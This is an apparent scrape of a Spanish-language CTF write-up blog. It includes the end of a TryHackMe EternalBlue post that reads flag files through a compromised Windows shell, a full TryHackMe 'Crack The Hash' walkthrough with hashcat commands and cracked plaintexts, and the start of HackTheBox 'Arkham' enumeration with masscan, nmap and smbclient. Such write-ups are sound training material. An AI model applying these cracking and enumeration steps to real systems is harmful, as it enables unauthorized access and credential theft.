C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent 03/17/2019 02:26 PM 482 flag1.lnk 03/17/2019 02:30 PM 848 flag2.lnk 03/17/2019 02:32 PM 2,344 flag3.lnk 3 File(s) 3,674 bytes Directory of C:\\Users\\Jon\\Documents 03/17/2019 02:26 PM 37 flag3.txt 1 File(s) 37 bytes Total Files Listed: 5 File(s) 3,735 bytes 0 Dir(s) 22,796,713,984 bytes free C:\\\u0026gt; C:\\\u0026gt;type C:\\Users\\Jon\\Documents\\flag3.txt type C:\\Users\\Jon\\Documents\\flag3.txt flag{*******************************} C:\\\u0026gt; C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;type flag2.lnk type flag2.lnk L�F� h+汖��h+汖��=]�����\u0026#39;P�O� �:i�+00�/C:\\R1�M�Windows��:���M�*pWindowsV1qN��System32��:��qN��*\tSystem32P1�Mconfig��:���M*�\tconfigX2\u0026#39;�M flag2.txtﾍM�M*�flag2.txtS-Rf �C:\\Windows\\System32\\config\\flag2.txt6..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\config\\flag2.txt�C:\\Windows\\System32\\config(\t�1SPS�XF�L8C���\u0026amp;�m�`�Xjon-pc��̴�H�C�Kz�k��:������d)d�4 C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;dir /ah C:\\Windows\\System32\\config dir /ah C:\\Windows\\System32\\config Volume in drive C has no label. Volume Serial Number is E611-0B66 Directory of C:\\Windows\\System32\\config File Not Found C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;   Nuestra flag2 se encuentra en **C:\\Windows\\System32\\config**.\n1 2 3 4  C:\\Windows\\system32\u0026gt;type C:\\Windows\\System32\\config\\flag2.txt type C:\\Windows\\System32\\config\\flag2.txt flag{****************************} C:\\Windows\\system32\u0026gt;   ","description":"","id":79,"section":"posts","tags":["windows","eternalblue","ms17_010"],"title":"TryHackMe - Blue","uri":"https://sckull.github.io/posts/blue-thm/"},{"content":"Crack The Hash es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.\n Informacion de la Maquina    Titulo Crack the hash     Info Cracking hashes challenges   RoomCode crackthehash   Puntos 2390   Dificultad Relativamente Facil   Maker ben    CRACK THE HASH En esta serie de retos nos proveen de distintas hashes las cuales debemos de crackear y enviar el resultado de cada una de estas, al principio utilizamos hash-identifier, hash analyzer y hash identification para identificar el tipo de hash y para el crackeo de los hashes utilizamos hashcat y crackstation.\nLinks de la herramientas y paginas utilizadas:\n hash-identifier hash-analyzer hahs-identification hashcat crackstation  NIVEL 1 #1 MD5 Hash:\n48bb6e862e54f2a795ffc4e541caed4d\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  root@kali:~# hash-identifier ######################################################################### #\t__ __ __\t______ _____\t# #\t/\\ \\/\\ \\\t/\\ \\ /\\__ _\\ /\\ _ `\\\t# #\t\\ \\ \\_\\ \\ __ ____ \\ \\ \\___\t\\/_/\\ \\/ \\ \\ \\/\\ \\\t# #\t\\ \\ _ \\ /\u0026#39;__`\\ / ,__\\ \\ \\ _ `\\\t\\ \\ \\ \\ \\ \\ \\ \\\t# #\t\\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\\t\\_\\ \\__ \\ \\ \\_\\ \\\t# #\t\\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/\t# #\t\\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.1 # #\tBy Zion3R # #\twww.Blackploit.com # #\tRoot@Blackploit.com # ######################################################################### ------------------------------------------------------------------------- HASH: 48bb6e862e54f2a795ffc4e541caed4d Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 0 hash.txt rockyou.txt   CrackStation Crackeada:\neasy:48bb6e862e54f2a795ffc4e541caed4d\n#2 SHA1 Hash:\nCBFDAC6008F9CAB4083784CBD1874F76618D2A97\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  HASH: CBFDAC6008F9CAB4083784CBD1874F76618D2A97 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Least Possible Hashs: [+] Tiger-160 [+] Haval-160 [+] RipeMD-160 [+] SHA-1(HMAC) [+] Tiger-160(HMAC) [+] RipeMD-160(HMAC) [+] Haval-160(HMAC) [+] SHA-1(MaNGOS) [+] SHA-1(MaNGOS2) [+] sha1($pass.$salt) [+] sha1($salt.$pass) [+] sha1($salt.md5($pass)) [+] sha1($salt.md5($pass).$salt) [+] sha1($salt.sha1($pass)) [+] sha1($salt.sha1($salt.sha1($pass))) [+] sha1($username.$pass) [+] sha1($username.$pass.$salt) [+] sha1(md5($pass)) [+] sha1(md5($pass).$salt) [+] sha1(md5(sha1($pass))) [+] sha1(sha1($pass)) [+] sha1(sha1($pass).$salt) [+] sha1(sha1($pass).substr($pass,0,3)) [+] sha1(sha1($salt.$pass)) [+] sha1(sha1(sha1($pass))) [+] sha1(strtolower($username).$pass) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 100 hash.txt rockyou.txt   Crackstation Crackeada:\npassword123:CBFDAC6008F9CAB4083784CBD1874F76618D2A97\n#3 SHA256 Hash:\n1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  HASH: 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 Possible Hashs: [+] SHA-256 [+] Haval-256 Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5($pass)) [+] SHA-256(sha1($pass)) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 1400 hash.txt rockyou.txt   CrackStation Crackeada:\nletmein:1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032\n#4 BCRYPT Hash:\n$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom\nHash-Analyzer Identificamos este hash con la pagina Tunnelsup y Utilizamos hashcat para poder desencriptar el hash el cual tomo mucho tiempo.\nHASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 3200 hash.txt ../rockyou.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 72 Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 Cracking performance lower than expected? * Append -w 3 to the commandline. This can cause your screen to lag. * Update your OpenCL runtime / driver the right way: https://hashcat.net/faq/wrongdriver * Create more work items to make use of your parallelization power: https://hashcat.net/faq/morework [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Session..........: hashcat Status...........: Running Hash.Type........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRom Time.Started.....: Thu Sep 5 15:31:19 2019 (10 mins, 43 secs) Time.Estimated...: Tue Oct 8 02:23:53 2019 (32 days, 10 hours) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 5 H/s (4.21ms) @ Accel:4 Loops:1 Thr:8 Vec:1 Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress.........: 3264/14344385 (0.02%) Rejected.........: 0/3264 (0.00%) Restore.Point....: 3264/14344385 (0.02%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:916-917 Candidates.#1....: alucard -\u0026gt; hottie101 Hardware.Mon.#1..: Temp: 71c Util: 92% Core:1189MHz Mem:2505MHz Bus:4 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s   Crackeada:\nbleh:$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom\n#5 MD4 Hash:\n279412f945939ba78ce0758d3fd83daa\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  HASH: 279412f945939ba78ce0758d3fd83daa Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 900 hash.txt rockyou.txt   CrackStation Crackeada:\nEternity22:279412f945939ba78ce0758d3fd83daa\nNIVEL 2 #1 SHA256 Hash:\nF09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  HASH: F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 Possible Hashs: [+] SHA-256 [+] Haval-256 Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5($pass)) [+] SHA-256(sha1($pass)) -------------------------------------------------------------------------   HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 1400 hash.txt ../rockyou.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule Session..........: hashcat Status...........: Cracked Hash.Type........: SHA2-256 Hash.Target......: f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f...2d0c85 Time.Started.....: Thu Sep 5 16:44:44 2019 (1 sec) Time.Estimated...: Thu Sep 5 16:44:45 2019 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 12297.6 kH/s (3.26ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 196608/14344385 (1.37%) Rejected.........: 0/196608 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456 -\u0026gt; piggy9 Hardware.Mon.#1..: Temp: 60c Util: 0% Core:1189MHz Mem:2505MHz Bus:4 Started: Thu Sep 5 16:44:42 2019 Stopped: Thu Sep 5 16:44:46 2019   CrackStation Crackeada:\nf09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule\n#2 NTLM Hash:\n1DFECA0C002AE40B8619ECF94819CC1B\nEste hash al principio con las herramientas para identificarlo parece como un hash de MD5, al intentar crackearla con el formato de NTLM nos crackeó el hash hashcat.\nHash Analyzer Hash Identification HASHIDENTIfIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  HASH: 1DFECA0C002AE40B8619ECF94819CC1B Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) -------------------------------------------------------------------------   HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m 1000 md5.hash rockyou.txt hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i Session..........: hashcat Status...........: Cracked Hash.Type........: NTLM Hash.Target......: 1dfeca0c002ae40b8619ecf94819cc1b Time.Started.....: Thu Sep 5 18:09:22 2019 (1 sec) Time.Estimated...: Thu Sep 5 18:09:23 2019 (0 secs) Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 7257.8 kH/s (3.00ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 5308416/14344385 (37.01%) Rejected.........: 0/5308416 (0.00%) Restore.Point....: 5111808/14344385 (35.64%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#2....: nguy7124 -\u0026gt; muppetme Hardware.Mon.#2..: Temp: 73c Util: 55% Core:1110MHz Mem:2505MHz Bus:4 Started: Thu Sep 5 18:09:21 2019 Stopped: Thu Sep 5 18:09:24 2019 sckull@tars:~/tools$   CrackStation Crackeada:\n1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i\n#3 SHA512 HashInfo:\n1 2 3  Hash: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02. Salt: aReallyHardSalt Rounds: 5   Hash Identification HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m 1800 sha512.hash rockyou.txt --session sha512 hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt * Uses-64-Bit Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Session..........: sha512 Status...........: Running Hash.Type........: sha512crypt $6$, SHA512 (Unix) Hash.Target......: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPM...ZAs02. Time.Started.....: Thu Sep 5 18:23:56 2019 (10 mins, 59 secs) Time.Estimated...: Thu Sep 5 19:27:46 2019 (52 mins, 51 secs) Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 3746 H/s (18.22ms) @ Accel:64 Loops:32 Thr:32 Vec:1 Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress.........: 2463744/14344385 (17.18%) Rejected.........: 0/2463744 (0.00%) Restore.Point....: 2463744/14344385 (17.18%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2784-2816 Candidates.#2....: จคภจจ/ภ-ึจ -\u0026gt; zz336649 Hardware.Mon.#2..: Temp: 86c Util: 93% Core:1137MHz Mem:2505MHz Bus:4   Crackeada:\n$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.:waka99\n#4 SHA1 HashInfo:\n1 2  Hash: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Salt: tryhackme   HASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ------------------------------------------------------------------------- HASH: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Least Possible Hashs: [+] Tiger-160 [+] Haval-160 [+] RipeMD-160 [+] SHA-1(HMAC) [+] Tiger-160(HMAC) [+] RipeMD-160(HMAC) [+] Haval-160(HMAC) [+] SHA-1(MaNGOS) [+] SHA-1(MaNGOS2) [+] sha1($pass.$salt) [+] sha1($salt.$pass) [+] sha1($salt.md5($pass)) [+] sha1($salt.md5($pass).$salt) [+] sha1($salt.sha1($pass)) [+] sha1($salt.sha1($salt.sha1($pass))) [+] sha1($username.$pass) [+] sha1($username.$pass.$salt) [+] sha1(md5($pass)) [+] sha1(md5($pass).$salt) [+] sha1(md5(sha1($pass))) [+] sha1(sha1($pass)) [+] sha1(sha1($pass).$salt) [+] sha1(sha1($pass).substr($pass,0,3)) [+] sha1(sha1($salt.$pass)) [+] sha1(sha1(sha1($pass))) [+] sha1(strtolower($username).$pass) -------------------------------------------------------------------------   HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 110 ../hash.sha1 ../rockyou.txt hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Minimim salt length supported by kernel: 0 Maximum salt length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt;   Crackeada:\ne5d8870e5bdd26602cab8dbe07a942c8669e56d6:481616481616\n","description":"","id":80,"section":"posts","tags":["challenge"],"title":"TryHackMe - Crack The Hash","uri":"https://sckull.github.io/posts/hashes/"},{"content":"Arkham es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Arkham     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.130   Maker MinatoTW    MASSCAN Escaneo de puertos tcp/udp.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~/htb/arkham# masscan -p1-65535,U:1-65535 10.10.10.130 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-25 19:10:12 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49666/tcp on 10.10.10.130 Discovered open port 139/tcp on 10.10.10.130 Discovered open port 445/tcp on 10.10.10.130 Discovered open port 135/tcp on 10.10.10.130 Discovered open port 8080/tcp on 10.10.10.130 Discovered open port 49667/tcp on 10.10.10.130   NMAP Escaneo de servicios en puertos anteriormente encontrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  root@sckull:~/htb/arkham# nmap -sV -p 135,139,445,8080,49666,49667 10.10.10.130 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-25 19:13 GMT Nmap scan report for 10.10.10.130 Host is up (0.36s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 8080/tcp open http Apache Tomcat 8.5.37 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.49 seconds   SMB Buscamos los sharenames a los que tengamos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@sckull:~/htb/arkham# smbclient -L 10.10.10.130 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin BatShare Disk Master Wayne\u0026#39;s secrets C$ Disk Default share IPC$ IPC Remote IPC Users Disk Reconnecting with SMB1 for workgroup listing. Connection to 10.10.10.130 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Failed to connect with SMB1 -- no workgroup available   SMB - BatShare Nos conectamos al sharename.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@sckull:~/htb/arkham# smbclient \\\\\\\\10.10.10.130\\\\BatShare Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; smb: \\\u0026gt; ls . D 0 Sun Feb 3 13:00:10 2019 .. D 0 Sun Feb 3 13:00:10 2019 